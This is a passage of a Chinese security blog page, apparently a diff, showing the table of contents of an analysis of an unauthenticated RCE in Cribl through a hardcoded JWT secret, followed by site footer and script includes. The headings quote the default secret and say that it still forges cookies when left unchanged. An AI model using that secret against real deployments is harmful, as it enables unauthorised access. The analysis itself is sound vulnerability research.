href="#所以该漏洞的主要问题在于未授权，即未登陆的状态下也可以利用伪造的-JWT-token进行任意命令执行。"><span class="nav-number">1.0.4.3.</span> <span class="nav-text">所以该漏洞的主要问题在于未授权，即未登陆的状态下也可以利用伪造的 JWT token进行任意命令执行。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面结合源码来分析漏洞所在。可以看到文件夹结构如下："><span class="nav-number">1.0.4.4.</span> <span class="nav-text">下面结合源码来分析漏洞所在。可以看到文件夹结构如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结合docker的entrypoint-sh："><span class="nav-number">1.0.4.5.</span> <span class="nav-text">结合docker的entrypoint.sh：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#以及start-sh"><span class="nav-number">1.0.4.6.</span> <span class="nav-text">以及start.sh:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以看到最核心的代码为cribl-bundle-js，进入分析："><span class="nav-number">1.0.4.7.</span> <span class="nav-text">可以看到最核心的代码为cribl.bundle.js，进入分析：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以很明显看到该代码是由webpack之类工具打包生成的了。。第一眼看上去一头雾水那么就需要结合一定的技巧进行分析，可以搜索关键词cribl-auth，因为Cookie中的cribl-auth字段即JWT-token，定位到下图的关键代码："><span class="nav-number">1.0.4.8.</span> <span class="nav-text">可以很明显看到该代码是由webpack之类工具打包生成的了。。第一眼看上去一头雾水那么就需要结合一定的技巧进行分析，可以搜索关键词cribl_auth，因为Cookie中的cribl_auth字段即JWT token，定位到下图的关键代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#美化之后如下："><span class="nav-number">1.0.4.9.</span> <span class="nav-text">美化之后如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以看到逻辑非常简单，只要jwt-token解码成功即可通过验证，而且无需如admin之类的特定用户名。结合作者的描述，可以认为只要还是硬编码的secret-d2hvIGxldCB0aGUgZG9ncyBvdXQ-增大了伪造的可能性降低了程序的安全性。"><span class="nav-number">1.0.4.10.</span> <span class="nav-text">可以看到逻辑非常简单，只要jwt token解码成功即可通过验证，而且无需如admin之类的特定用户名。结合作者的描述，可以认为只要还是硬编码的secret d2hvIGxldCB0aGUgZG9ncyBvdXQ=增大了伪造的可能性降低了程序的安全性。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面我们看看这个secret"><span class="nav-number">1.0.4.11.</span> <span class="nav-text">下面我们看看这个secret:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后我们来看看开发者使用了那个库来生成jwt-token的搜索JWT关键字："><span class="nav-number">1.0.4.12.</span> <span class="nav-text">最后我们来看看开发者使用了那个库来生成jwt token的搜索JWT关键字：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在搜索的时候我们可以看到下面的关键字也是非常重要的。"><span class="nav-number">1.0.4.13.</span> <span class="nav-text">在搜索的时候我们可以看到下面的关键字也是非常重要的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以看到诸如版本信息，报错信息等关键字符串，结合上述信息进行搜索，可以搜到："><span class="nav-number">1.0.4.14.</span> <span class="nav-text">可以看到诸如版本信息，报错信息等关键字符串，结合上述信息进行搜索，可以搜到：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-github-com-hokaccha-node-jwt-simple"><span class="nav-number">1.0.4.15.</span> <span class="nav-text">https://github.com/hokaccha/node-jwt-simple</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面我们来验证一下："><span class="nav-number">1.0.4.16.</span> <span class="nav-text">下面我们来验证一下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以看到和poc的原作者所使用的cookie是一样的："><span class="nav-number">1.0.4.17.</span> <span class="nav-text">可以看到和poc的原作者所使用的cookie是一样的：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#修复"><span class="nav-number">1.0.5.</span> <span class="nav-text">修复</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#让我们看看后续版本是如何修复的，老规矩，使用-v1-5-1-版本的-image，映射到-9001-端口："><span class="nav-number">1.0.5.1.</span> <span class="nav-text">让我们看看后续版本是如何修复的，老规矩，使用 v1.5.1 版本的 image，映射到 9001 端口：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以看到之前的-exp-已经不能生效了："><span class="nav-number">1.0.5.2.</span> <span class="nav-text">可以看到之前的 exp 已经不能生效了：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#跟进源码，查看-v1-5-1-对程序进行了何种修改："><span class="nav-number">1.0.5.3.</span> <span class="nav-text">跟进源码，查看 v1.5.1 对程序进行了何种修改：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以看到关键的secret不再硬编码，改成了从-opt-local-cribl-auth-cribl-secret该文件中进行读取。"><span class="nav-number">1.0.5.4.</span> <span class="nav-text">可以看到关键的secret不再硬编码，改成了从/opt/local/cribl/auth/cribl.secret该文件中进行读取。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#那么考虑到使用docker中自带的密钥，是否可以伪造-cookie？"><span class="nav-number">1.0.5.5.</span> <span class="nav-text">那么考虑到使用docker中自带的密钥，是否可以伪造 cookie？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#实验成功了。。只能说如果开发者在生产环境中不换默认的-secret-最后还是会翻车，照样未授权-RCE。"><span class="nav-number">1.0.5.6.</span> <span class="nav-text">实验成功了。。只能说如果开发者在生产环境中不换默认的 secret 最后还是会翻车，照样未授权 RCE。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#总结"><span class="nav-number">1.0.6.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#事实又一次强调了开发过程中注意安全的重要性，但在这波分析之后，个人感觉这个洞本质上有点弱？之前版本的问题主要在于硬编码密钥，之后的版本改为了通过配置文件配置密钥。但这种配置方式在某种程度上仍然存在一定问题，比如开发者在生产环境中没有配置新的密钥，那用默认的密钥同样可以伪造签名。。"><span class="nav-number">1.0.6.1.</span> <span class="nav-text">事实又一次强调了开发过程中注意安全的重要性，但在这波分析之后，个人感觉这个洞本质上有点弱？之前版本的问题主要在于硬编码密钥，之后的版本改为了通过配置文件配置密钥。但这种配置方式在某种程度上仍然存在一定问题，比如开发者在生产环境中没有配置新的密钥，那用默认的密钥同样可以伪造签名。。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接"><span class="nav-number">1.0.7.</span> <span class="nav-text">参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-xz-aliyun-com-t-7139-toc-3"><span class="nav-number">1.0.7.1.</span> <span class="nav-text">https://xz.aliyun.com/t/7139#toc-3</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-jwt-io"><span class="nav-number">1.0.7.2.</span> <span class="nav-text">https://jwt.io/</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">152.6k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
